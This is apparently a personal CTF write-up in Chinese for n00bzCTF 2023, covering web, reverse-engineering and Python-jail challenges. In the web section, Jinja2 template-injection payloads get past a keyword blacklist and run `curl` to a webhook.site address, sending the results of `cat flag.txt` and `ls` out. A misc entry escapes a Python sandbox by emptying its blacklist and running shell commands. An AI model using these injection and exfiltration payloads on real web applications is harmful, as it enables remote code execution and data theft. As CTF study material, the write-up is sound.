
# web
### Club_N00b
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230610214410.png)
需要输入`secret_phrase` 
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230610214456.png)
是图里的 `radical`
### Robots
访问`/robots.txt`
### Secret Group
http头大考验
### Conditions
```python
@app.route('/login',methods=['GET','POST'])
def login():
    if request.method == 'GET':
        return render_template('login.html')
    elif request.method == 'POST':
        if len(request.values["username"]) >= 40:
            return render_template_string("Username is too long!")
        elif len(request.values["username"].upper()) <= 50:
            return render_template_string("Username is too short!")
        else:
            return flag
```

字符串经过`upper()`后长度会>50

GPT yyds
> 例如，德语中的字符 "ß"（双 s）在转换为大写字母时，会变成 "SS"，这就导致了字符串长度的变化。另外，一些带有变音符号的字符在转换为大写字母时，可能会分解为多个 Unicode 码位，从而使字符串长度变大。

### CaaS
```python
def blacklist(inp):
    blacklist = ['mro','url','join','attr','dict','()','init','import','os','system','lipsum','current_app','globals','subclasses','|','getitem','popen','read','ls','flag.txt','cycler','[]','0','1','2','3','4','5','6','7','8','9','=','+',':','update','config','self','class','%','#']
    for b in blacklist:
        if b in inp:
            return "Blacklisted word!"
    if len(inp) <= 70:
        return inp
    if len(inp) > 70:
        return "Input too long!"
```
#SSTI 
长度限制太难受了

---
*payload*
```python
{{request.application.__builtins__.exec(request.values["team_name"])}}
```
*传参*
```python
name={{request.application.__builtins__.exec(request.values["team_name"])}}&team_name=__import__('os').system('curl https://webhook.site/4c54ec5c-1d5f-4f25-b755-53bfbe650b5c?user=$(cat flag.txt)')
```
### CaaS2
与上一题payload一样,但是这次需要找到flag文件,执行命令
*传参*
```python
name={{request.application.__builtins__.exec(request.values["team_name"])}}&team_name=__import__('os').system('curl https://webhook.site/4c54ec5c-1d5f-4f25-b755-53bfbe650b5c?user=$(ls|tr \'\n\' \'~\')')
```
文件名`s3cur3_fl4g_f1l3_.txt` cat会丢失掉{},使用base64

# reverse
### Welcome
ida打开即可
### EZrev
给了一个.class文件,jadx打开
```java
package defpackage;

import java.util.Arrays;

/* renamed from: EZrev  reason: default package */
/* loaded from: EZrev.class */
public class EZrev {
    public static void main(String[] strArr) {
        if (strArr.length != 1) {
            System.out.println("L");
            return;
        }
        String str = strArr[0];
        if (str.length() != 31) {
            System.out.println("L");
            return;
        }
        int[] array = str.chars().toArray();
        for (int i = 0; i < array.length; i++) {
            if (i % 2 == 0) {
                array[i] = (char) (array[i] ^ 19);
            } else {
                array[i] = (char) (array[i] ^ 55);
            }
        }
        for (int i2 = 0; i2 < array.length / 2; i2++) {
            if (i2 % 2 == 0) {
                array[i2] = (char) (array[(array.length - 1) - i2] + 20);
                array[(array.length - 1) - i2] = (char) (array[i2] - 10);
            } else {
                array[i2] = (char) (array[i2] + 30);
            }
        }
        if (Arrays.equals(array, new int[]{130, 37, 70, 115, 64, 106, 143, 34, 54, 134, 96, 98, 125, 98, 138, 104, 25, 3, 66, 78, 24, 69, 91, 80, 87, 67, 95, 8, 25, 22, 115})) {
            System.out.println("W");
        } else {
            System.out.println("L");
        }
    }
}
```

```python
string=[130, 37, 70, 115, 64, 106, 143, 34, 54, 134, 96, 98, 125, 98, 138, 104, 25, 3, 66, 78, 24, 69, 91, 80, 87, 67, 95, 8, 25, 22, 115]
print(string)
for i in range(15):
    if(i%2==0):
        string[30-i]=string[30-i]+10
        string[i]=string[i]-20
        string[i],string[30-i]=string[30-i],string[i] //!!!
    else:
        string[i]=string[i]-30


for i in range(len(string)):
    if i%2==0:
        string[i]=string[i]^19
    else:
        string[i]=string[i]^55

flag=[chr(i) for i in string]

print("".join(flag))


```
脑子没转过来,还画了一个图...,中间那个字符交换想了好久

### zzz
```python
#!/usr/bin/env python3
# Flag: n00bz{ZzZ_zZZ_zZz_ZZz_zzZ_Zzz}
from z3 import *

secret = [BitVec(f"secret_{i}", 8) for i in range(30)]
s = Solver()

for i in range(6, 29):
    s.add(secret[i] >= 65)
    s.add(secret[i] <= 123)

s.add(secret[0] == ord('n'))
s.add(secret[1] == ord('0'))
s.add(secret[2] == ord('0'))
s.add(secret[3] == ord('b'))
s.add(secret[4] == ord('z'))
s.add(secret[5] == ord('{'))
s.add(secret[29] == ord('}'))

s.add(secret[0] >> 4 == 6)
s.add((secret[1] ^ secret[2]) == 0)
s.add((secret[3] | secret[6]) == 122)
s.add((secret[3] & secret[6]) == 66)
s.add(secret[4] ^ secret[28] == 0)
s.add(secret[5] * secret[29] * 0x1337 == 75629625)
s.add((secret[6] + secret[7] + secret[8]) == 302)
s.add(((secret[6] * secret[7]) - secret[8]) == 10890)
s.add((secret[9] - secret[8]) == 5)
s.add((secret[10] - secret[9]) == 27)
s.add((secret[11] ^ secret[10]) == 32)
s.add(secret[12] - secret[15] == 0)
s.add(secret[12] + secret[11] == 180)
s.add(secret[13] + secret[12] == 185)
s.add((secret[13] + secret[14] - secret[16]) == secret[13])
s.add(secret[16] + secret[17] == 217)
s.add(secret[17] ^ secret[13] == 0)
s.add(secret[18] == secret[19])
s.add(secret[18] == 90)
s.add((secret[19] ^ secret[20] ^ secret[21]) == 127)
s.add(secret[21] == 95)
s.add((secret[20] ^ secret[21] ^ secret[22]) == secret[21])
s.add((~secret[23] + secret[24]) == -33)
s.add(secret[24] + secret[6] == 180)
s.add(secret[25] == secret[9])
s.add(secret[26] + secret[27] == 212)
s.add(secret[27] == secret[28])


print(s.check())
m = s.model()

for i in range(30):
    print(chr(m[secret[i]].as_long()), end='')
print()
```
### Mypin
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230611015507.png)


```java
    public String getData() {
        int length = this.mydata.length / 9;
        String str = "";
        int i = 5;
        int i2 = 0;
        for (int i3 = 1; i3 <= length; i3++) {
            int i4 = 0;
            int i5 = 1;
            for (int i6 = 1; i6 <= 8; i6++) {
                i4 += this.mydata[(9 * i3) - i6] * i5;
                i5 <<= 1;
            }
            i--;
            i2 = (int) (i2 + ((i4 - 33) * Math.pow(85.0d, i)));
            if (i == 0) {
                str = str + misteri(i2);
                i2 = 0;
                i = 5;
            }
        }
        while (i > 0) {
            i--;
            i2 = (int) (i2 + (84.0d * Math.pow(85.0d, i)));
        }
        return str + misteri(i2);
    }
```


### VM
给了两个文件`vm`和`code`
可以通过`vm code` 通过读取文件获取操作码来执行命令
```bash
./vm code < /dev/zero | xargs | python -c 'print("".join([chr(int(x)) for x in input().split()]))'
n00bz{x0r_XoRR_xOR}
```

# pwn

# crypto

# Misc
### Big Blacklist
#python_escape 
![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20230611034527.png)


---
没想到可以删除blacklist,,,
```python
#删除黑名单
for i in range(len(blacklist)):blacklist.pop()
#执行多行命令
while True:exec(input())
#执行
  import os
os.system('ls')
flag.txt
jail.py
os.system('cat flag.txt')
n00bz{blacklist.pop()_ftw!_7a5d2f8b}
```
## *相关wp*
https://github.com/n00bzUnit3d/n00bzCTF2023-OfficalWriteups



2023-06-10   21:34